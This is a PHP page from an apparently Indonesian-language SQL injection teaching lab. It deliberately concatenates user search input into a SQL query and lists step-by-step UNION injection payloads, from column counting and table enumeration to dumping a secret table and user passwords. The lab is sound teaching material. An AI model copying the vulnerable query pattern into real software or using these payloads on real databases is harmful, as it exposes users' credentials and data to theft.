<?php
// ============================================================
// vulnerable/search.php — Demo UNION-Based SQL Injection
// ⚠️  JANGAN gunakan kode seperti ini di produksi!
// ============================================================

require_once '../config.php';

$results   = [];
$query_log = '';
$error_msg = '';
$search    = '';
$num_cols  = 0;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $search = $_POST['search'] ?? '';
    $conn   = getConnection();

    // ❌ KODE RENTAN: tidak ada sanitasi sama sekali
    $sql = "SELECT id, username, email FROM users WHERE username LIKE '%$search%'";

    $query_log = $sql;

    $res = mysqli_query($conn, $sql);

    if ($res === false) {
        $error_msg = mysqli_error($conn);
    } else {
        $num_cols = mysqli_num_fields($res);
        while ($row = mysqli_fetch_assoc($res)) {
            $results[] = $row;
        }
    }

    mysqli_close($conn);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pencarian Rentan — SQLi Demo</title>
    <link rel="stylesheet" href="../assets/css/style.css">
</head>
<body>

<nav class="navbar">
    <div class="brand">⚠️ SQLi Demo Lab</div>
    <div class="nav-links">
        <a href="../index.php">Home</a>
        <a href="login.php">Login Rentan</a>
        <a href="search.php" class="active">Pencarian Rentan</a>
        <a href="../secure/search.php">Pencarian Aman</a>
    </div>
</nav>

<div class="container">
    <div class="page-header">
        <span class="badge badge-danger">RENTAN — UNION SQL INJECTION</span>
        <h1>Demo 2: Ekstraksi Data</h1>
        <p>Gunakan UNION injection untuk membaca data dari tabel lain yang seharusnya tidak bisa diakses.</p>
    </div>

    <!-- ── FORM PENCARIAN ── -->
    <div class="card danger">
        <h2>🔍 Pencarian User (Versi Rentan)</h2>

        <form method="POST">
            <div class="form-group">
                <label>Cari Username</label>
                <input type="text" name="search"
                       value="<?= htmlspecialchars($search) ?>"
                       placeholder="Coba: %' UNION SELECT id,data_name,data_value FROM secret_data-- -"
                       autocomplete="off">
            </div>
            <button type="submit" class="btn btn-danger">Cari</button>
        </form>
    </div>

    <!-- ── HASIL ── -->
    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
    <div class="card">
        <h2>📊 Hasil Query</h2>

        <?php if ($error_msg): ?>
            <div class="alert alert-warning">
                <span class="icon">⚠️</span>
                <div><strong>SQL Error:</strong> <?= htmlspecialchars($error_msg) ?></div>
            </div>
        <?php elseif (empty($results)): ?>
            <div class="alert alert-info">
                <span class="icon">ℹ️</span>
                <div>Tidak ada hasil ditemukan.</div>
            </div>
        <?php else: ?>
            <div class="alert alert-danger" style="margin-bottom:16px">
                <span class="icon">💀</span>
                <div>
                    <strong><?= count($results) ?> baris data berhasil diambil!</strong>
                    <?php if (str_contains(strtoupper($search), 'UNION')): ?>
                        Data dari tabel <strong>secret_data</strong> berhasil dieksfiltrasi!
                    <?php endif; ?>
                </div>
            </div>
            <div class="table-wrap">
                <table>
                    <thead>
                        <tr>
                            <th>Kolom 1</th>
                            <th>Kolom 2</th>
                            <th>Kolom 3</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($results as $row): ?>
                        <tr>
                            <?php foreach ($row as $val): ?>
                            <td class="td-mono"><?= htmlspecialchars((string)$val) ?></td>
                            <?php endforeach; ?>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <!-- ── QUERY LOG ── -->
    <?php if ($query_log): ?>
    <div class="card">
        <h2>🔍 Query yang Dieksekusi</h2>
        <div class="code-block"><?= htmlspecialchars($query_log) ?></div>
    </div>
    <?php endif; ?>

    <!-- ── PAYLOAD SUGGESTIONS ── -->
    <div class="card">
        <h2>🎯 Payload — Coba Satu per Satu</h2>
        <p style="color:#888;font-size:0.85rem;margin-bottom:4px">
            <strong style="color:#f1c40f">Langkah 1:</strong> Cari tahu jumlah kolom
        </p>
        <div class="payload-list" style="margin-bottom:16px">
            <span class="payload-chip" onclick="fillSearch(this, &quot;%' ORDER BY 1-- -&quot;)">%' ORDER BY 1-- -</span>
            <span class="payload-chip" onclick="fillSearch(this, &quot;%' ORDER BY 3-- -&quot;)">%' ORDER BY 3-- -</span>
            <span class="payload-chip" onclick="fillSearch(this, &quot;%' ORDER BY 4-- -&quot;)">%' ORDER BY 4-- - (error → 3 kolom)</span>
        </div>

        <p style="color:#888;font-size:0.85rem;margin-bottom:4px">
            <strong style="color:#f1c40f">Langkah 2:</strong> Lihat nama tabel di database
        </p>
        <div class="payload-list" style="margin-bottom:16px">
            <span class="payload-chip" onclick="fillSearch(this, &quot;%' UNION SELECT table_name,table_schema,NULL FROM information_schema.tables-- -&quot;)">UNION → info tabel</span>
        </div>

        <p style="color:#888;font-size:0.85rem;margin-bottom:4px">
            <strong style="color:#f1c40f">Langkah 3:</strong> Eksfiltrasi data rahasia
        </p>
        <div class="payload-list">
            <span class="payload-chip" onclick="fillSearch(this, &quot;%' UNION SELECT id,data_name,data_value FROM secret_data-- -&quot;)">UNION → secret_data ⚠️</span>
            <span class="payload-chip" onclick="fillSearch(this, &quot;%' UNION SELECT id,username,password FROM users-- -&quot;)">UNION → semua password ⚠️</span>
        </div>
    </div>

    <!-- ── PENJELASAN ── -->
    <div class="card">
        <h2>📖 Bagaimana UNION Injection Bekerja?</h2>
        <div class="info-box">
            <strong>Query asli:</strong><br>
            <span style="font-family:'Courier New',monospace;font-size:0.83rem;color:#f1c40f">
SELECT id, username, email FROM users WHERE username LIKE '%budi%'
            </span><br><br>
            <strong>Setelah diinjeksi dengan UNION:</strong><br>
            <span style="font-family:'Courier New',monospace;font-size:0.83rem;">
                <span style="color:#ccc">SELECT id, username, email FROM users WHERE username LIKE '%</span><span style="color:#e44d42">%' UNION SELECT id,data_name,data_value FROM secret_data-- -</span><span style="color:#555">%'</span>
            </span><br><br>
            Perintah <code style="color:#e44d42">UNION</code> menggabungkan hasil dua query sekaligus — sehingga data dari tabel <code style="color:#e44d42">secret_data</code> ikut ditampilkan bersama hasil pencarian user biasa.
            <br><br>
            <strong style="color:#f39c12">Syarat UNION berhasil:</strong> jumlah kolom pada kedua query harus sama (dalam kasus ini, keduanya 3 kolom).
        </div>
    </div>

    <div style="text-align:center;margin-top:10px">
        <a href="../secure/search.php" style="color:#27ae60;text-decoration:none;font-size:0.9rem">
            → Lihat versi AMAN menggunakan Prepared Statements
        </a>
    </div>
</div>

<footer class="footer">
    Dibuat untuk keperluan edukasi — SQL Injection Demo Lab
</footer>

<script>
function fillSearch(el, text) {
    document.querySelector('input[name="search"]').value = text;
    el.style.background = '#1a0a1a';
    el.style.borderColor = '#e44d42';
    setTimeout(() => {
        el.style.background = '';
        el.style.borderColor = '';
    }, 600);
}
</script>

</body>
</html>
